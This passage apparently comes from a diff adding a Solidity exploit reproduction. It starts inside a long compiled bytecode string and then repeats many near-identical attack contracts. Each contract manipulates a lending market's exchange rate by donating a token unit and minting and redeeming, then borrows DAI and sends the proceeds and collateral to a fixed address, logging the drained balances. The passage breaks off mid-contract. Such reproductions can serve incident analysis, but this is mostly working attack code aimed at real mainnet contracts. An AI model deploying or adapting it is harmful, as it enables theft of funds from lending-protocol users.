05180830381600087803b1580156105be57600080fd5b505af11580156105d2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105f69190611271565b506040516370a0823160e01b81526001600160a01b037f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc769811660048301526000917f0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f909116906370a082319060240160206040518083038186803b15801561067d57600080fd5b505afa158015610691573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106b59190611271565b90505b6001811115610bcf576040516370a0823160e01b81523060048201527f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e56001600160a01b03169063db006a759082906370a082319060240160206040518083038186803b15801561072857600080fd5b505afa15801561073c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107609190611271565b6040518263ffffffff1660e01b815260040161077e91815260200190565b600060405180830381600087803b15801561079857600080fd5b505af11580156107ac573d6000803e3d6000fd5b5050505060006040516107be90610e1c565b604051809103906000f0801580156107da573d6000803e3d6000fd5b506040516370a0823160e01b81523060048201529091506001600160a01b037f000000000000000000000000f573e6740045b5387f6d36a26b102c2adf639af5169063a9059cbb90839083906370a082319060240160206040518083038186803b15801561084757600080fd5b505afa15801561085b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061087f9190611271565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401602060405180830381600087803b1580156108c557600080fd5b505af11580156108d9573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108fd9190611248565b506040516362a0f63160e01b81526001600160a01b037f000000000000000000000000959fb43ef08f415da0aea39beef92d96f41e41b3811660048301527f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e5811660248301527f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc769811660448301528216906362a0f63190606401600060405180830381600087803b1580156109b157600080fd5b505af11580156109c5573d6000803e3d6000fd5b5050604051637af1e23160e11b81526001600160a01b038481166004830152600160248301527f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e5811660448301527f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc76916925063f5e3c4629150606401602060405180830381600087803b158015610a5b57600080fd5b505af1158015610a6f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a939190611271565b5060405163db006a7560e01b8152600160048201527f000000000000000000000000f5140fc35c6f94d02d7466f793feb0216082d7e56001600160a01b03169063db006a7590602401600060405180830381600087803b158015610af657600080fd5b505af1158015610b0a573d6000803e3d6000fd5b50506040516370a0823160e01b81526001600160a01b037f000000000000000000000000e5c6c14f466a4f3a73ecec7f3aaaa15c5ecbc769811660048301527f0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f1692506370a08231915060240160206040518083038186803b158015610b8f57600080fd5b505afa158015610ba3573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bc79190611271565b9150506106b8565b7f0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f6001600160a01b031663a9059cbb73ba12222222228d8ba445958a75a0704d566bf2c889600081518110610c2657610c26611320565b602002602001015189600081518110610c4157610c41611320565b6020026020010151610c539190611336565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401602060405180830381600087803b158015610c9957600080fd5b505af1158015610cad573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610cd19190611248565b506040516370a0823160e01b81523060048201527f0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f6001600160a01b03169063a9059cbb907f0000000000000000000000009b99d7ce9e39c68ab93348fd31fd4c99f79e4b199083906370a082319060240160206040518083038186803b158015610d5b57600080fd5b505afa158015610d6f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d939190611271565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401602060405180830381600087803b158015610dd957600080fd5b505af1158015610ded573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610e119190611248565b505050505050505050565b610a018061134f83390190565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff81118282101715610e6857610e68610e29565b604052919050565b600067ffffffffffffffff821115610e8a57610e8a610e29565b5060051b60200190565b6001600160a01b0381168114610ea957600080fd5b50565b600082601f830112610ebd57600080fd5b81356020610ed2610ecd83610e70565b610e3f565b82815260059290921b84018101918181019086841115610ef157600080fd5b8286015b84811015610f0c5780358352918301918301610ef5565b509695505050505050565b60008060408385031215610f2a57600080fd5b823567ffffffffffffffff80821115610f4257600080fd5b818501915085601f830112610f5657600080fd5b81356020610f66610ecd83610e70565b82815260059290921b84018101918181019089841115610f8557600080fd5b948201945b83861015610fac578535610f9d81610e94565b82529482019490820190610f8a565b96505086013592505080821115610fc257600080fd5b50610fcf85828601610eac565b9150509250929050565b600082601f830112610fea57600080fd5b813567ffffffffffffffff81111561100457611004610e29565b611017601f8201601f1916602001610e3f565b81815284602083860101111561102c57600080fd5b816020850160208301376000918101602001919091529392505050565b6000806000806080858703121561105f57600080fd5b843567ffffffffffffffff8082111561107757600080fd5b818701915087601f83011261108b57600080fd5b8135602061109b610ecd83610e70565b82815260059290921b8401810191818101908b8411156110ba57600080fd5b948201945b838610156110e15785356110d281610e94565b825294820194908201906110bf565b985050880135925050808211156110f757600080fd5b61110388838901610eac565b9450604087013591508082111561111957600080fd5b61112588838901610eac565b9350606087013591508082111561113b57600080fd5b5061114887828801610fd9565b91505092959194509250565b6000815180845260005b8181101561117a5760208185018101518683018201520161115e565b8181111561118c576000602083870101525b50601f01601f19169290920160200192915050565b6001600160a01b0385811682526080602080840182905286519184018290526000928782019290919060a0860190855b818110156111ef5785518516835294830194918301916001016111d1565b5050858103604087015287518082529082019350915080870160005b838110156112275781518552938201939082019060010161120b565b50505050828103606084015261123d8185611154565b979650505050505050565b60006020828403121561125a57600080fd5b8151801515811461126a57600080fd5b9392505050565b60006020828403121561128357600080fd5b5051919050565b634e487b7160e01b600052601160045260246000fd5b6000826112bd57634e487b7160e01b600052601260045260246000fd5b500490565b600080604083850312156112d557600080fd5b505080516020909101519092909150565b60006000198214156112fa576112fa61128a565b5060010190565b600081600019048311821515161561131b5761131b61128a565b500290565b634e487b7160e01b600052603260045260246000fd5b600082198211156113495761134961128a565b50019056fe608060405234801561001057600080fd5b506109e1806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806362a0f63114610030575b600080fd5b61004361003e366004610879565b610045565b005b60003390506000826001600160a01b0316636f307dc36040518163ffffffff1660e01b815260040160206040518083038186803b15801561008557600080fd5b505afa158015610099573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100bd91906108c4565b90506000846001600160a01b0316636f307dc36040518163ffffffff1660e01b815260040160206040518083038186803b1580156100fa57600080fd5b505afa15801561010e573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061013291906108c4565b6040805160018082528183019092529192506000919060208083019080368337019050509050858160008151811061016c5761016c6108e8565b6001600160a01b039283166020918202929092010152604051631853304760e31b81529088169063c2998238906101a79084906004016108fe565b600060405180830381600087803b1580156101c157600080fd5b505af11580156101d5573d6000803e3d6000fd5b505060405163a9059cbb60e01b81526001600160a01b038981166004830152600160248301528516925063a9059cbb9150604401602060405180830381600087803b15801561022357600080fd5b505af1158015610237573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061025b919061094b565b506040516370a0823160e01b81523060048201526000906001600160a01b038416906370a082319060240160206040518083038186803b15801561029e57600080fd5b505afa1580156102b2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102d6919061096d565b60405163095ea7b360e01b81526001600160a01b038981166004830152602482018390529192509084169063095ea7b390604401602060405180830381600087803b15801561032457600080fd5b505af1158015610338573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061035c919061094b565b5060405163140e25ad60e31b8152600481018290526001600160a01b0388169063a0712d6890602401602060405180830381600087803b15801561039f57600080fd5b505af11580156103b3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103d7919061096d565b506040516370a0823160e01b81523060048201526001600160a01b0388169063db006a759060029083906370a082319060240160206040518083038186803b15801561042257600080fd5b505afa158015610436573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061045a919061096d565b6104649190610986565b6040518263ffffffff1660e01b815260040161048291815260200190565b600060405180830381600087803b15801561049c57600080fd5b505af11580156104b0573d6000803e3d6000fd5b50506040516370a0823160e01b81523060048201526001600160a01b038616925063a9059cbb9150899083906370a082319060240160206040518083038186803b1580156104fd57600080fd5b505afa158015610511573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610535919061096d565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401602060405180830381600087803b15801561057b57600080fd5b505af115801561058f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105b3919061094b565b506040516370a0823160e01b81526001600160a01b038781166004830152600091908616906370a082319060240160206040518083038186803b1580156105f957600080fd5b505afa15801561060d573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610631919061096d565b9050600068478eae0e571ba00000821161064b5781610656565b68478eae0e571ba000005b60405163317afabb60e21b8152600481018290529091506001600160a01b0389169063c5ebeaec90602401602060405180830381600087803b15801561069b57600080fd5b505af11580156106af573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106d3919061096d565b5060405163852a12e360e01b8152600481018490526001600160a01b038a169063852a12e390602401602060405180830381600087803b15801561071657600080fd5b505af115801561072a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061074e919061096d565b5060405163a9059cbb60e01b81526001600160a01b0388811660048301526024820183905287169063a9059cbb90604401602060405180830381600087803b15801561079957600080fd5b505af11580156107ad573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107d1919061094b565b5060405163a9059cbb60e01b81526001600160a01b0388811660048301526024820185905286169063a9059cbb90604401602060405180830381600087803b15801561081c57600080fd5b505af1158015610830573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610854919061094b565b5050505050505050505050565b6001600160a01b038116811461087657600080fd5b50565b60008060006060848603121561088e57600080fd5b833561089981610861565b925060208401356108a981610861565b915060408401356108b981610861565b809150509250925092565b6000602082840312156108d657600080fd5b81516108e181610861565b9392505050565b634e487b7160e01b600052603260045260246000fd5b6020808252825182820181905260009190848201906040850190845b8181101561093f5783516001600160a01b03168352928401929184019160010161091a565b50909695505050505050565b60006020828403121561095d57600080fd5b815180151581146108e157600080fd5b60006020828403121561097f57600080fd5b5051919050565b6000828210156109a657634e487b7160e01b600052601160045260246000fd5b50039056fea2646970667358221220e7dd0835295aa08014029d77625ad54e4b40e29343fb3e32cee92e246120411e64736f6c63430008090033a2646970667358221220c09d03ee34d5d4a6ee1ee6c4946cf78271f1c290812662515d1d8ef1164dbeff64736f6c63430008090033";
+        assembly {
+            return(add(rt, 0x20), mload(rt))
+        }
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract Xbf9c {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr15 = new address[](1);
+        arr15[0] = xf514;
+        I(x959f).enterMarkets(arr15);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 7527514103416337088120;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "7527514103416337088120 (7527.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X58de {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr17 = new address[](1);
+        arr17[0] = xf514;
+        I(x959f).enterMarkets(arr17);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 6207514103416337088121;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "6207514103416337088121 (6207.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X3d0e {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr09 = new address[](1);
+        arr09[0] = xf514;
+        I(x959f).enterMarkets(arr09);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 11487514103416337088117;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "11487514103416337088117 (11487.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X3a36 {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr13 = new address[](1);
+        arr13[0] = xf514;
+        I(x959f).enterMarkets(arr13);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 8847514103416337088119;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "8847514103416337088119 (8847.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X8cbb {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr19 = new address[](1);
+        arr19[0] = xf514;
+        I(x959f).enterMarkets(arr19);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 4887514103416337088122;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "4887514103416337088122 (4887.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X7605 {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+
+    constructor() payable {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X0b63 {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr21 = new address[](1);
+        arr21[0] = xf514;
+        I(x959f).enterMarkets(arr21);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 3567514103416337088123;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "3567514103416337088123 (3567.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X8619 {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr23 = new address[](1);
+        arr23[0] = xf514;
+        I(x959f).enterMarkets(arr23);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 2247514103416337088124;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "2247514103416337088124 (2247.5141 ether)");
+        I(xe5c6).borrow(1320000000000000000000);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, 1320000000000000000000);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X547d {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr25 = new address[](1);
+        arr25[0] = xf514;
+        I(x959f).enterMarkets(arr25);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
+        console2.log("I(xf514).balanceOf(r)\t\t->", uint256(16499999999999));
+        I(xf514).redeem(16499999999997);
+        // uint256 v3 = 3299999999999599999999;
+        uint256 v3 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999599999999 (3299.9999 ether)");
+        I(xf573).transfer(xf514, v3);
+        // uint256 v4 = 927514103416337088125;
+        uint256 v4 = I(x6b17).balanceOf(xe5c6);
+        console2.log("I(x6b17).balanceOf(xe5c6)\t->", "927514103416337088125 (927.5141 ether)");
+        I(xe5c6).borrow(v4);
+        I(xf514).redeemUnderlying(v1);
+        I(x6b17).transfer(xa6d3, v4);
+        I(xf573).transfer(xa6d3, v1);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract X53d8 {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant x959f = 0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3;
+    address constant xe5c6 = 0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769;
+    address constant xf514 = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;
+    address constant xf573 = 0xf573E6740045b5387F6d36a26B102C2adF639af5;
+
+    address xa6d3;
+
+    constructor(address a_xa6d3) payable {
+        xa6d3 = a_xa6d3; // 0xA6D35c97Bd00B99a962393408aAa9EB275a45c5e
+    }
+
+    function start(address, address, address) public {
+        I(xe5c6).underlying();
+        I(xf514).underlying();
+
+        address[] memory arr11 = new address[](1);
+        arr11[0] = xf514;
+        I(x959f).enterMarkets(arr11);
+
+        I(xf573).transfer(xf514, 1);
+        // uint256 v1 = 3299999999999999999999;
+        uint256 v1 = I(xf573).balanceOf(r);
+        console2.log("I(xf573).balanceOf(r)\t\t->", "3299999999999999999999 (3299.9999 ether)");
+        I(xf573).approve(xf514, v1);
+        I(xf514).mint(v1);
+        // uint256 v2 = 16499999999999;
+        uint256 v2 = I(xf514).balanceOf(r);
